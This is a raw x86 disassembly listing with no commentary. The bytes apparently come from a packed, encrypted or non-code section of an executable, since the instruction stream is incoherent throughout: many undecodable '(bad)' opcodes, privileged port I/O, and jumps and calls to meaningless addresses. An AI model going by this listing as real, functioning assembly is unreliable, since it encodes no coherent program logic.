  40df0b:	add    bl,bh
  40df0d:	cmp    DWORD PTR [edx+0x24],0xffffff9d
  40df11:	jbe    0x40df20
  40df13:	xchg   esp,eax
  40df14:	or     eax,0xdd32005b
  40df19:	das    
  40df1a:	mov    edi,0x426e9574
  40df1f:	and    al,0xfd
  40df21:	or     DWORD PTR [eax],eax
  40df23:	add    BYTE PTR [ebp-0x2db8d84],cl
  40df29:	pusha  
  40df2a:	and    esp,eax
  40df2c:	popf   
  40df2d:	add    ecx,DWORD PTR [ebx+0x2e0f94c]
  40df33:	dec    esp
  40df34:	test   eax,0x39448b57
  40df39:	push   ebx
  40df3a:	lea    ebx,[esp+ebx*2-0x5]
  40df3e:	mov    BYTE PTR [ecx+edi*1+0xb],bl
  40df42:	test   ebx,ebx
  40df44:	fsubr  DWORD PTR [edi-0x181900cf]
  40df4a:	mov    al,bl
  40df4c:	cmc    
  40df4d:	rol    BYTE PTR es:[ecx],1
  40df50:	dec    ebp
  40df51:	jp     0x40df49
  40df53:	test   DWORD PTR [edx-0xc],edx
  40df56:	pop    esi
  40df57:	mov    ebx,ecx
  40df59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df5a:	cs mov esi,esp
  40df5d:	adc    BYTE PTR [eax+0x16],cl
  40df60:	mov    ah,0x9d
  40df62:	mov    DWORD PTR [esi-0xb],eax
  40df65:	pop    edi
  40df66:	cld    
  40df67:	add    BYTE PTR [esi-0x17],bh
  40df6a:	fisttp WORD PTR [edi+0x7c]
  40df6d:	fdivp  st(6),st
  40df6f:	mov    DWORD PTR [eax],eax
	...
  40df89:	mov    eax,0xb3885809
  40df8e:	lahf   
  40df8f:	mov    BYTE PTR [ebx+0x18],al
  40df92:	adc    al,0x8c
  40df94:	inc    esi
  40df95:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df97:	ins    BYTE PTR es:[edi],dx
  40df98:	inc    esi
  40df99:	stc    
  40df9a:	jmp    0x40df50
  40df9c:	jae    0x40dfae
  40df9e:	clc    
  40df9f:	xchg   BYTE PTR [esi-0x4],bl
  40dfa2:	or     dh,BYTE PTR [ebp+0x3cedfbd5]
  40dfa8:	add    eax,0xb60493f7
  40dfad:	xor    ebx,DWORD PTR [esi+0x828ff52]
  40dfb3:	and    BYTE PTR [ebx-0x55],dl
  40dfb6:	out    dx,al
  40dfb7:	add    al,0xb6
  40dfb9:	cmp    esp,DWORD PTR [edi+0x5f620f52]
  40dfbf:	cld    
  40dfc0:	dec    BYTE PTR [eax]
  40dfc2:	or     BYTE PTR [eax],bh
  40dfc4:	add    esi,DWORD PTR [edi+0x6fd5b38c]
  40dfca:	sbb    dh,0x3b
  40dfcd:	ja     0x40dfaf
  40dfcf:	fisttp WORD PTR [eax+ebp*8+0x5de84ac7]
  40dfd6:	fld    QWORD PTR [edx]
  40dfd8:	add    BYTE PTR [ecx-0x68],dh
  40dfdb:	ficom  WORD PTR [ebx+0x4c]
  40dfde:	cld    
  40dfdf:	ret    0xf400
  40dfe2:	and    BYTE PTR [eax],dh
  40dfe4:	and    al,0xd4
  40dfe6:	add    ecx,ebp
  40dfe8:	shl    ch,0x9b
  40dfeb:	xchg   DWORD PTR [eax+eax*1+0x0],eax
	...
  40e003:	add    BYTE PTR [eax],al
  40e005:	add    ah,ch
  40e007:	add    al,0x70
  40e009:	sbb    edi,DWORD PTR [edi-0x3a]
  40e00c:	cmp    eax,0xcb79cf56
  40e011:	push   esi
  40e012:	ss or  ecx,ebp
  40e015:	mov    BYTE PTR [ebx-0x77359400],dh
  40e01b:	cld    
  40e01c:	jno    0x40e069
  40e01e:	cld    
  40e01f:	jnp    0x40e041
  40e021:	or     BYTE PTR [edi],cl
  40e023:	repnz popa 
  40e025:	push   ebx
  40e026:	in     al,dx
  40e027:	jmp    0x575d11de
  40e02c:	jb     0x40e061
  40e02e:	lock jg 0x40e02d
  40e031:	xor    DWORD PTR [edx-0x16],eax
  40e034:	mov    ds:0x7226f830,al
  40e039:	adc    dh,BYTE PTR [edi-0x3d]
  40e03c:	jmp    0xa57f:0xf01338a
  40e043:	aaa    
  40e044:	jnp    0x40e063
  40e046:	std    
  40e047:	adc    ebx,esp
  40e049:	push   es
  40e04a:	ja     0x40e00f
  40e04c:	jmp    0xb6c4:0x1a01338a
  40e053:	or     eax,0xa879f407
  40e059:	pop    es
  40e05a:	mov    bh,0x57
  40e05c:	jb     0x40e005
  40e05e:	je     0x40e000
  40e060:	test   al,0x1
  40e062:	hlt    
  40e063:	add    al,0x97
  40e065:	dec    esp
  40e066:	or     al,0xcb
  40e068:	call   0x40e070
	...
  40e081:	add    BYTE PTR [eax],al
  40e083:	hlt    
  40e084:	sbb    ch,cl
  40e086:	je     0x40e0e3
  40e088:	mov    edx,0xadcb03a9
  40e08d:	repz push ebx
  40e08f:	add    al,BYTE PTR [ebp-0x17]
  40e092:	xor    BYTE PTR [edi],0x0
  40e095:	xchg   ebx,eax
  40e096:	add    esp,ebx
  40e098:	add    BYTE PTR es:[edx],ah
  40e09b:	mov    ah,0x4
  40e09d:	push   0x11a556b0
  40e0a2:	shl    DWORD PTR [ebp-0x14],1
  40e0a5:	add    ecx,ebp
  40e0a7:	je     0x40e121
  40e0a9:	rcl    esp,0x67
  40e0ac:	scas   al,BYTE PTR es:[edi]
  40e0ad:	out    0xb1,eax
  40e0af:	jo     0x40e05e
  40e0b1:	(bad)  
  40e0b2:	in     al,dx
  40e0b3:	sub    DWORD PTR [eax+eax*1],eax
  40e0b6:	jmp    0x4390f9a4
  40e0bb:	clc    
  40e0bc:	jg     0x40e132
  40e0be:	jns    0x40e133
  40e0c0:	(bad)  
  40e0c3:	mov    esi,DWORD PTR [edx+0x0]
  40e0c6:	jmp    0xcabe4d47
  40e0cb:	je     0x40e0fe
  40e0cd:	fcom   DWORD PTR [ecx+0x5e]
  40e0d0:	lods   al,BYTE PTR ds:[esi]
  40e0d1:	(bad)  
  40e0d2:	jmp    0xe8969446
  40e0d7:	idiv   DWORD PTR [ecx+0x44]
  40e0da:	cmp    DWORD PTR [eax],ebp
  40e0dc:	add    ch,0x19
  40e0df:	pop    ds
  40e0e0:	popf   
  40e0e1:	pop    esi
  40e0e2:	sti    
  40e0e3:	clc    
  40e0e4:	add    al,0x85
  40e0e6:	sub    DWORD PTR [eax],eax
	...
  40e100:	not    DWORD PTR [ecx+0x31b86dbf]
  40e106:	or     BYTE PTR [edx],bl
  40e108:	mov    al,0x22
  40e10a:	mov    ds:0x475239,eax
  40e10f:	sahf   
  40e110:	sbb    BYTE PTR [edx+0x79f7e900],bl
  40e116:	test   BYTE PTR [ebx],ch
  40e118:	inc    ebp
  40e119:	stos   DWORD PTR es:[edi],eax
  40e11a:	inc    bh
  40e11c:	cmp    eax,0x28a9feac
  40e121:	xor    bh,cl
  40e123:	pop    ecx
  40e124:	stc    
  40e125:	mov    ebp,0x81ee62c2
  40e12a:	mov    edi,0x4ea8d100
  40e12f:	call   0x3e45e6
  40e134:	into   
  40e135:	sahf   
  40e136:	inc    dl
  40e138:	int    0xb5
  40e13a:	out    0xdd,al
  40e13c:	fiadd  WORD PTR [eax]
  40e13e:	add    BYTE PTR [esi-0x40],dl
  40e141:	mov    bl,0xbc
  40e143:	or     BYTE PTR [ebx+0x43],ch
  40e146:	add    BYTE PTR [esi+0x2a],dl
  40e149:	or     eax,0xdd1218
  40e14e:	cmp    BYTE PTR ds:0x41d525,0xd
  40e155:	in     eax,dx
  40e156:	push   ss
  40e157:	call   0x3e585a
  40e15c:	popa   
  40e15d:	enter  0xe72,0x5e
  40e161:	popf   
  40e162:	jmp    0x0:0xdd
	...
  40e17d:	push   cs
  40e17e:	add    DWORD PTR [eax],eax
  40e180:	(bad)  
  40e181:	ror    BYTE PTR [edi+0xdd43db],1
  40e187:	push   esi
  40e188:	jmp    DWORD PTR [eax-0x32bfee05]
  40e18e:	pcmpgtd mm1,mm3
  40e191:	push   cs
  40e192:	add    DWORD PTR [edx+0x0],ebp
  40e195:	lds    edi,FWORD PTR [edi]
  40e197:	fiadd  WORD PTR [ebx-0x63]
  40e19a:	jbe    0x40e1af
  40e19c:	and    BYTE PTR [esi+0x3d8b0047],bl
  40e1a2:	jge    0x40e198
  40e1a4:	je     0x40e13c
  40e1a6:	or     edi,edi
  40e1a8:	push   esi
  40e1a9:	retf   0x1c0c
  40e1ac:	adc    ecx,DWORD PTR [ebp+0x7]
  40e1af:	test   eax,eax
  40e1b1:	inc    ecx
  40e1b2:	push   ss
  40e1b3:	cmp    eax,0x75d80
  40e1b8:	je     0x40e1af
  40e1ba:	dec    esi
  40e1bb:	call   DWORD PTR ds:0x401599f4
  40e1c1:	hlt    
  40e1c2:	into   
  40e1c3:	ret    0x795d
  40e1c6:	fnsave [esi]
  40e1c8:	push   cs
  40e1c9:	jg     0x40e224
  40e1cb:	out    0x3,al
  40e1cd:	ins    DWORD PTR es:[edi],dx
  40e1ce:	pushf  
  40e1cf:	jb     0x40e1d1
  40e1d1:	dec    edi
  40e1d2:	mov    ds:0xd01fc57d,eax
  40e1d7:	cmc    
  40e1d8:	mov    edi,0x5502a136
  40e1dd:	outs   dx,DWORD PTR ds:[esi]
  40e1de:	rol    DWORD PTR [ebx+ebp*8+0x0],0x0
	...
  40e1fa:	add    al,0x1e
  40e1fc:	out    dx,eax
  40e1fd:	out    0x31,eax
  40e1ff:	fiadd  WORD PTR [ebx]
  40e201:	add    BYTE PTR [edx+0x42333712],ah
  40e207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e208:	rol    BYTE PTR [edx-0xc],1
  40e20b:	adc    esi,DWORD PTR [ecx+0x42ae0c14]
  40e211:	add    BYTE PTR [ecx+ecx*8-0x66],dh
  40e215:	fdiv   QWORD PTR [edi]
  40e217:	pushf  
  40e218:	add    dh,BYTE PTR [ebp+0x3]
  40e21b:	test   BYTE PTR [ebp-0x3],ah
  40e21e:	rol    DWORD PTR [ebx-0x65bf4079],cl
  40e224:	and    DWORD PTR [eax+edx*8],0xffffff91
  40e228:	inc    esp
  40e229:	add    ah,dh
  40e22b:	popa   
  40e22c:	push   es
  40e22d:	call   0x1434203
  40e232:	inc    edx
  40e233:	dec    ebx
  40e234:	pop    ss
  40e235:	sbb    al,0x6
  40e237:	pop    esp
  40e238:	add    ch,BYTE PTR [edx-0xa]
  40e23b:	jae    0x40e2ba
  40e23d:	je     0x40e1c3
  40e23f:	push   esp
  40e240:	dec    ecx
  40e241:	sti    
  40e242:	cmc    
  40e243:	fwait
  40e244:	jnp    0x40e28a
  40e246:	in     al,dx
  40e247:	cwde   
  40e248:	xchg   edx,eax
  40e249:	(bad)  
  40e24a:	jnp    0x40e1e8
  40e24c:	sbb    al,BYTE PTR [edx]
  40e24e:	cmc    
  40e24f:	add    al,0xe9
  40e251:	add    eax,esp
  40e253:	jge    0x40e27b
  40e255:	pushf  
  40e256:	xchg   edx,eax
  40e257:	scas   al,BYTE PTR es:[edi]
  40e258:	out    0x3,eax
  40e25a:	into   
  40e25b:	add    BYTE PTR [edi+eax*2+0x0],bl
	...
  40e277:	add    BYTE PTR [ebp+0x72],dl
  40e27a:	retf   0x6753
  40e27d:	add    DWORD PTR [ebx],eax
  40e27f:	hlt    
  40e280:	ja     0x40e2f5
  40e282:	scas   eax,DWORD PTR es:[edi]
  40e283:	outs   dx,BYTE PTR ds:[esi]
  40e284:	ret    
  40e285:	add    dh,ch
  40e287:	das    
  40e288:	add    al,0xe9
  40e28a:	sbb    eax,0x1453aa00
  40e28f:	and    esi,DWORD PTR [eax]
  40e291:	aad    0xb0
  40e293:	add    BYTE PTR [ecx-0x9],cl
  40e296:	inc    ebx
  40e297:	hlt    
  40e298:	test   DWORD PTR [edi+edi*8+0x58d0c37e],ebp
  40e29f:	inc    DWORD PTR [ebx]
  40e2a1:	jmp    0xaafc7cf6
  40e2a6:	push   ebx
  40e2a8:	push   eax
  40e2a9:	jb     0x40e24a
  40e2ab:	je     0x40e245
  40e2ad:	and    al,0x8
  40e2af:	hlt    
  40e2b0:	add    al,0x69
  40e2b2:	out    dx,al
  40e2b3:	imul   esp,DWORD PTR [esi+0x55f50429],0x1f
  40e2ba:	pop    ecx
  40e2bb:	jg     0x40e289
  40e2bd:	cmc    
  40e2be:	or     BYTE PTR [esi],al
  40e2c0:	lds    edi,FWORD PTR [edi+0x16]
  40e2c3:	cmc    
  40e2c4:	add    al,0xe9
  40e2c6:	jle    0x40e330
  40e2c8:	aam    0x63
  40e2ca:	mov    al,0xaa
  40e2cc:	pushf  
  40e2cd:	or     BYTE PTR [ecx],dh
  40e2cf:	hlt    
  40e2d0:	add    al,0x64
  40e2d2:	inc    esi
  40e2d3:	mov    al,0x54
  40e2d5:	dec    esi
  40e2d6:	ss cld 
  40e2d8:	jge    0x40e308
  40e2da:	push   ebx
	...
  40e2f3:	add    BYTE PTR [ecx+ebx*8+0x7f82b03d],bl
  40e2fa:	call   DWORD PTR [ecx]
  40e2fc:	ret    0x8cd7
  40e2ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e300:	cmp    edi,DWORD PTR [ecx]
  40e302:	push   0x46a919
  40e307:	xchg   ecx,eax
  40e308:	test   BYTE PTR [eax+eax*1],0x69
  40e30c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e30d:	adc    BYTE PTR [edx+edi*8+0x21f704b7],ah
  40e314:	stc    
  40e315:	(bad)  
  40e316:	std    
  40e317:	sub    ecx,edx
  40e319:	xchg   edi,eax
  40e31a:	add    cl,ch
  40e31c:	idiv   DWORD PTR [ebp-0x33]
  40e31f:	daa    
  40e320:	test   BYTE PTR [ecx+eax*2],0x33
  40e324:	in     eax,dx
  40e325:	stos   DWORD PTR es:[edi],eax
  40e326:	call   0x45dbde
  40e32b:	push   0xffffff8d
  40e32d:	sar    ebx,0xce
  40e330:	arpl   WORD PTR [ecx-0x552f9375],bp
  40e336:	(bad)  
  40e337:	mov    esi,0xa18477a8
  40e33c:	inc    esp
  40e33d:	stos   BYTE PTR es:[edi],al
  40e33e:	inc    cl
  40e340:	or     DWORD PTR [edi+0x0],eax
  40e343:	jmp    0x724d14b6
  40e348:	(bad)  
  40e349:	jns    0x40e2cf
  40e34b:	mov    eax,ds:0x81fea7a4
  40e350:	adc    eax,DWORD PTR [edi+0x0]
  40e353:	jmp    0xb1408ec8
	...
  40e370:	add    al,bh
  40e372:	add    al,0x76
  40e374:	in     al,dx
  40e375:	fld    QWORD PTR [ebx]
  40e377:	pop    edi
  40e378:	add    BYTE PTR [ebp-0xc],0xc8
  40e37c:	push   0x5f
  40e37e:	add    al,0xf
  40e380:	je     0x40e33b
  40e382:	push   ds
  40e383:	add    dh,BYTE PTR [edi-0x16963de2]
  40e389:	scas   al,BYTE PTR es:[edi]
  40e38a:	(bad)
  40e38d:	and    eax,0x9200014f
  40e392:	xor    dh,BYTE PTR [edi+0x443ef8]
  40e398:	and    DWORD PTR [edx],0x2
  40e39b:	jne    0x40e3d5
  40e39d:	loopne 0x40e3dc
  40e39f:	or     BYTE PTR [eax-0x30],dl
  40e3a2:	jge    0x40e362
  40e3a4:	sti    
  40e3a5:	add    bl,BYTE PTR [eax+0x4e]
  40e3a8:	mov    ebx,DWORD PTR [esi]
  40e3aa:	sub    al,0x5c
  40e3ac:	or     al,0xc4
  40e3ae:	sub    eax,0x5742fbbf
  40e3b3:	out    0x9d,al
  40e3b5:	arpl   WORD PTR [eax+eax*1],ax
  40e3b8:	mov    ebp,DWORD PTR ds:0xf075f47d
  40e3be:	sbb    ebp,ebp
  40e3c0:	add    DWORD PTR ds:0x5d858d04,ecx
  40e3c6:	jne    0x40e3c5
  40e3c8:	call   FWORD PTR [ebx+0x4]
  40e3cb:	add    BYTE PTR [eax-0x3c],al
  40e3ce:	in     eax,dx
  40e3cf:	clc    
  40e3d0:	jmp    0x3e3af8
	...
  40e3ed:	add    BYTE PTR [esi+0x890bec],dl
  40e3f3:	test   eax,0x84e575fd
  40e3f8:	inc    ebx
  40e3f9:	les    ebp,FWORD PTR [ebx]
  40e3fb:	push   eax
  40e3fc:	push   eax
  40e3fd:	push   0x416d7d
  40e402:	jne    0x40e45e
  40e404:	inc    BYTE PTR [eax]
  40e406:	(bad)  ds:0xa7c83bd7
  40e40c:	jb     0x40e414
  40e40e:	fisttp DWORD PTR [eax+0x39cce1f]
  40e414:	mov    ecx,0x39cee
  40e419:	lea    ebx,[eax]
  40e41b:	aam    0xfb
  40e41d:	push   esp
  40e41f:	dec    esi
  40e420:	(bad)  
  40e423:	pop    ebp
  40e424:	cmp    esi,DWORD PTR [ebp-0x73]
  40e427:	xor    eax,edx
  40e429:	pop    esi
  40e42a:	and    ah,BYTE PTR [ebx-0x45]
  40e42d:	shr    esp,0x9d
  40e430:	push   edi
  40e431:	mov    esp,DWORD PTR [eax+0x1a]
  40e434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e435:	div    DWORD PTR [ebp+0x11]
  40e438:	aas    
  40e439:	add    al,0xf4
  40e43b:	popf   
  40e43c:	push   ecx
  40e43d:	push   esi
  40e43e:	ret    
  40e43f:	and    BYTE PTR [edi+0x23],dh
  40e442:	aam    0x9c
  40e444:	add    al,BYTE PTR [eax]
  40e446:	pop    esp
  40e447:	test   eax,0x18f4002e
  40e44c:	inc    edi
  40e44d:	and    al,0xd8
  40e44f:	lea    ebp,[ebp+0x74]
	...
  40e469:	add    BYTE PTR [eax],al
  40e46b:	cld    
  40e46c:	and    al,ch
  40e46e:	dec    edi
  40e46f:	sbb    al,0x9b
  40e471:	lods   al,BYTE PTR ds:[esi]
  40e472:	(bad)  
  40e473:	and    ebx,DWORD PTR [eax]
  40e475:	inc    eax
  40e476:	and    al,0x4
  40e478:	in     eax,dx
  40e479:	sbb    DWORD PTR [ecx],eax
  40e47b:	(bad)  
  40e47c:	jb     0x40e4ce
  40e47e:	mov    eax,0x80029df5
  40e483:	mov    WORD PTR [ebp-0x47],gs
  40e486:	inc    edx
  40e487:	hlt    
  40e488:	or     eax,0x18437b
  40e48d:	jnp    0x40e4ea
  40e48f:	adc    BYTE PTR [ebx+ebp*4+0x42ac2014],bh
  40e496:	add    BYTE PTR [ecx+0x5c],dh
  40e499:	sbb    al,BYTE PTR ss:[ecx+0x240be7e0]
  40e4a0:	xor    DWORD PTR [eax+0x24],ecx
  40e4a3:	loopne 0x40e4b0
  40e4a5:	jg     0x40e4ea
  40e4a7:	adc    BYTE PTR [eax-0x3fcf72ae],bh
  40e4ad:	push   cs
  40e4ae:	call   0x329ea1c
  40e4b3:	hlt    
  40e4b4:	cdq    
  40e4b5:	jmp    0x5fe7983a
  40e4ba:	dec    eax
  40e4bb:	fcom   DWORD PTR [eax]
  40e4bd:	push   0xffffffac
  40e4bf:	mov    dh,dh
  40e4c1:	ins    BYTE PTR es:[edi],dx
  40e4c2:	jg     0x40e447
  40e4c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4c5:	call   0x6d379bb2
  40e4ca:	xchg   DWORD PTR [ebx-0x5a],esi
  40e4cd:	call   0x40e552
	...
  40e4e6:	add    BYTE PTR [eax],al
  40e4e8:	out    dx,eax
  40e4e9:	loopne 0x40e4eb
  40e4eb:	add    ebp,ecx
  40e4ed:	repz mov eax,0xf8e0e7ac
  40e4f3:	jle    0x40e4a4
  40e4f5:	loopne 0x40e4e3
  40e4f7:	jle    0x40e480
  40e4f9:	loope  0x40e49b
  40e4fb:	add    ah,dh
  40e4fd:	add    al,0x26
  40e4ff:	mov    BYTE PTR [edi],dl
  40e501:	dec    ebp
  40e502:	jmp    0xf403:0xe902f403
  40e509:	pushf  
  40e50a:	or     DWORD PTR [ebp-0xc],0xd037de04
  40e511:	clc    
  40e512:	popa   
  40e513:	mov    bl,0x1b
  40e515:	push   ebp
  40e516:	pushf  
  40e517:	add    dh,ah
  40e519:	jnp    0x40e557
  40e51b:	call   0x7ee2d70f
  40e520:	ja     0x40e503
  40e522:	mov    eax,0x1904f402
  40e527:	jg     0x40e560
  40e529:	loope  0x40e56f
  40e52b:	jnp    0x40e56c
  40e52d:	loope  0x40e56b
  40e52f:	pushf  
  40e530:	jae    0x40e57a
  40e532:	jmp    0xc571643a
  40e537:	pop    ss
  40e538:	(bad)  
  40e53a:	cld    
  40e53b:	cld    
  40e53c:	outs   dx,BYTE PTR ds:[esi]
  40e53d:	cmp    ch,al
  40e53f:	jmp    FWORD PTR [esi-0x32]
  40e542:	jmp    DWORD PTR [ebx+0x3b]
  40e545:	loope  0x40e59e
  40e547:	sbb    DWORD PTR [edi],0xe90049
	...
  40e565:	sbb    al,0x41
  40e567:	or     al,0x22
  40e569:	mov    ch,0x31
  40e56b:	add    ah,BYTE PTR [eax-0x79]
  40e56e:	ins    BYTE PTR es:[edi],dx
  40e56f:	in     eax,dx
  40e570:	call   0x6dcdea6c
  40e575:	fwait
  40e576:	inc    ebp
  40e577:	add    ecx,ebp
  40e579:	idiv   DWORD PTR [edi+edx*1-0x57]
  40e57d:	cs xor dl,bh
  40e580:	bound  esi,QWORD PTR [ebx+0xb120be0]
  40e586:	ins    BYTE PTR es:[edi],dx
  40e587:	in     eax,dx
  40e588:	call   0x6dcdea84
  40e58d:	pop    ebx
  40e58e:	inc    ebp
  40e58f:	add    ecx,ebp
  40e591:	idiv   DWORD PTR [edi+edx*1-0x57]
  40e595:	(bad)  
  40e596:	das    
  40e597:	cli    
  40e598:	mov    edx,0x925e4637
  40e59d:	lods   al,BYTE PTR ds:[esi]
  40e59e:	mov    al,ds:0xa52f2b5c
  40e5a3:	push   ebx
  40e5a4:	jb     0x40e622
  40e5a6:	push   esp
  40e5a7:	push   esi
  40e5a8:	ins    BYTE PTR es:[edi],dx
  40e5a9:	mov    ch,0xa8
  40e5ab:	dec    edi
  40e5ac:	inc    ebx
  40e5ad:	stc    
  40e5ae:	pushf  
  40e5af:	leave  
  40e5b0:	iret   
  40e5b1:	pop    edi
  40e5b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5b3:	test   BYTE PTR [ecx+0x3c8312c4],ch
  40e5b9:	dec    esp
  40e5ba:	add    DWORD PTR [ebp-0x1b],esi
  40e5bd:	jb     0x40e5b3
  40e5bf:	dec    edi
  40e5c0:	rcr    DWORD PTR [esi-0x30],0x0
  40e5c4:	jmp    0xf22bb02b
	...
  40e5e1:	add    BYTE PTR [edi-0x53],al
  40e5e4:	mov    bl,0xa5
  40e5e6:	stc    
  40e5e7:	add    al,0x33
  40e5e9:	test   eax,0xc2ce3e
  40e5ee:	loopne 0x40e613
  40e5f0:	jmp    0x40e643
  40e5f2:	jecxz  0x40e62b
  40e5f4:	lea    eax,[ebp+0x29]
  40e5f7:	cmp    DWORD PTR [edx+0x2],ebp
  40e5fa:	jne    0x40e58d
  40e5fc:	cld    
  40e5fd:	call   FWORD PTR [edx]
  40e5ff:	and    al,0xef
  40e601:	test   DWORD PTR [ebx-0x2b],eax
  40e604:	push   ds
  40e605:	mov    esp,DWORD PTR [eax+0x6c]
  40e608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e609:	add    DWORD PTR [eax-0x7ab274f0],esp
  40e60f:	ss push 0x15
  40e612:	fadd   QWORD PTR [eax+0x7567e85d]
  40e618:	(bad)  
  40e619:	inc    DWORD PTR [ebx+0x4ccc7b80]
  40e61f:	or     BYTE PTR [eax+0x54a10601],dh
  40e625:	call   0x404298
  40e62a:	das    
  40e62b:	enter  0x5e5d,0x4
  40e62f:	retf   
  40e630:	add    al,BYTE PTR [eax]
  40e632:	pusha  
  40e633:	and    ebp,ebx
  40e635:	add    DWORD PTR [ecx],0x71
  40e638:	jg     0x40e626
  40e63a:	loope  0x40e641
  40e63c:	add    BYTE PTR [eax],al
  40e63e:	loop   0x40e6af
  40e640:	jae    0x40e64a
  40e642:	inc    ebp
  40e643:	daa    
  40e644:	(bad)  
  40e645:	inc    DWORD PTR [eax]
	...
  40e65f:	sub    ah,BYTE PTR [edi+edi*4]
  40e662:	jne    0x40e652
  40e664:	sbb    eax,0x8005247b
  40e669:	adc    DWORD PTR [eax],edi
  40e66b:	invd   
  40e66d:	mov    ecx,DWORD PTR [ebp-0x2b]
  40e670:	sbb    al,0x83
  40e672:	and    al,0xb
  40e674:	add    eax,0x31d0000
  40e679:	adc    eax,0xe6c7665f
  40e67e:	jmp    0x40e674
  40e680:	and    DWORD PTR [eax+eax*1],eax
  40e683:	pop    esp
  40e684:	add    BYTE PTR ds:[eax],al
  40e687:	hlt    
  40e688:	sbb    BYTE PTR [edi],bh
  40e68a:	and    al,0xe8
  40e68c:	test   DWORD PTR [ebx],0x52c0b350
  40e692:	push   ss
  40e693:	xor    al,0xae
  40e695:	test   ebx,eax
  40e697:	lock retf 0xe47d
  40e69b:	cmp    eax,esi
  40e69d:	(bad)  
  40e69e:	jmp    FWORD PTR [eax]
  40e6a0:	daa    
  40e6a1:	xchg   edi,eax
  40e6a2:	push   eax
  40e6a3:	and    eax,0x830c1c5c
  40e6a8:	pusha  
  40e6a9:	cli    
  40e6aa:	out    0x79,eax
  40e6ac:	icebp  
  40e6ad:	add    eax,DWORD PTR [eax]
  40e6af:	xor    DWORD PTR [eax-0x5a],0x9ac8de4f
  40e6b6:	mul    BYTE PTR [ecx-0x16]
  40e6b9:	test   eax,0xb128648a
  40e6be:	je     0x40e6b8
  40e6c0:	mov    edi,0xeac2
	...
  40e6d9:	add    BYTE PTR [eax],al
  40e6db:	add    BYTE PTR ds:0x77fc4027,dl
  40e6e1:	add    eax,0x77f775f7
  40e6e6:	not    BYTE PTR [edi-0x3c]
  40e6e9:	sub    DWORD PTR [ecx+0xeb2fc74],0x4c
  40e6f0:	or     ch,dh
  40e6f2:	add    eax,DWORD PTR [ebx-0x17af4ed0]
  40e6f8:	sub    BYTE PTR [esi+0x2],ah
  40e6fb:	add    BYTE PTR [esp+ebp*4+0x48],al
  40e6ff:	leave  
  40e700:	ss mov cl,0x2
  40e703:	push   ebp
  40e704:	outs   dx,DWORD PTR ds:[esi]
  40e705:	rcl    DWORD PTR [edx+0x51],1
  40e708:	dec    edx
  40e709:	add    esi,DWORD PTR [edi+0x44]
  40e70c:	call   0xf509030d
  40e711:	add    al,0xe9
  40e713:	add    ecx,esp
  40e715:	push   edi
  40e716:	fwait
  40e717:	test   eax,0x7f988ed2
  40e71c:	rcr    DWORD PTR [ecx],0xed
  40e71f:	jl     0x40e759
  40e721:	mov    eax,ds:0x54e0312
  40e726:	jb     0x40e6e2
  40e728:	fwait
  40e729:	dec    eax
  40e72a:	jne    0x40e730
  40e72c:	hlt    
  40e72d:	lea    esi,[eax+0x7f]
  40e730:	mov    ds:0x8c51ef18,al
  40e735:	jge    0x40e768
  40e737:	add    esi,esp
  40e739:	lea    ebp,ds:0x29cc2a49
  40e73f:	dec    edi
	...
  40e758:	add    BYTE PTR [edi-0x4f],ch
  40e75b:	imul   esp,DWORD PTR [edi],0x2e9a04ec
  40e761:	add    al,0x2f
  40e763:	jmp    0xe9462383
  40e768:	add    esp,DWORD PTR [edi]
  40e76a:	lds    edx,FWORD PTR [eax]
  40e76c:	out    dx,al
  40e76d:	pop    edi
  40e76e:	mov    ds:0x90049d1d,al
  40e773:	stos   DWORD PTR es:[edi],eax
  40e774:	sti    
  40e775:	mov    ebx,0xf51de92e
  40e77a:	mov    eax,ds:0xb753fb7b
  40e77f:	inc    DWORD PTR [ebx]
  40e781:	hlt    
  40e782:	xchg   DWORD PTR [eax],ebp
  40e784:	das    
  40e785:	lock (bad) 
  40e787:	sub    BYTE PTR [ebp-0x3a45e04],bl
  40e78d:	xchg   ebx,eax
  40e78e:	int3   
  40e78f:	call   0xf9eddb97
  40e794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e795:	or     ah,BYTE PTR [edx-0x7113d133]
  40e79b:	mov    al,ds:0xe7cdac9b
  40e7a0:	add    edi,DWORD PTR [esi-0x3b]
  40e7a3:	call   DWORD PTR [ecx]
  40e7a5:	xor    eax,edi
  40e7a7:	add    ebp,ecx
  40e7a9:	js     0x40e754
  40e7ab:	call   FWORD PTR [edx+ebx*8]
  40e7ae:	dec    ecx
  40e7af:	je     0x40e79b
  40e7b1:	enter  0xc261,0x3
  40e7b5:	sar    DWORD PTR [ecx],0xc3
  40e7b8:	add    ecx,edx
  40e7ba:	cmp    ebx,eax
  40e7bc:	sbb    al,0x0
	...
  40e7d6:	cmp    DWORD PTR [esi-0x7204727e],ebp
  40e7dc:	inc    esp
  40e7dd:	in     eax,0x40
  40e7df:	(bad)  
  40e7e0:	ficom  DWORD PTR [edi]
  40e7e2:	inc    ebp
  40e7e3:	mov    WORD PTR [ebp+eiz*2-0x71],ds
  40e7e7:	stc    
  40e7e8:	push   cs
  40e7e9:	and    BYTE PTR gs:[edx+0x4902e9fe],ah
  40e7f0:	cld    
  40e7f1:	mov    ecx,0x46f96b5f
  40e7f6:	dec    esp
  40e7f7:	test   DWORD PTR [edi-0x940c12],edi
  40e7fd:	call   0xe18575f9
  40e802:	jg     0x40e862
  40e804:	(bad)  
  40e805:	mov    WORD PTR es:[eax+0x34a6f14c],ss
  40e80c:	mov    DWORD PTR [edi+ebx*4-0x73f21657],ebp
  40e813:	mov    ds:0x8e3f848a,al
  40e818:	out    dx,eax
  40e819:	xchg   esi,eax
  40e81a:	mov    al,0xcf
  40e81c:	out    0x61,eax
  40e81e:	lock add al,0x0
  40e821:	gs aaa 
  40e823:	sbb    BYTE PTR [edx],cl
  40e825:	aas    
  40e826:	js     0x40e7e4
  40e828:	leave  
  40e829:	call   0x1b36be25
  40e82e:	push   ebx
  40e82f:	(bad)  
  40e830:	mov    edi,0x88acad61
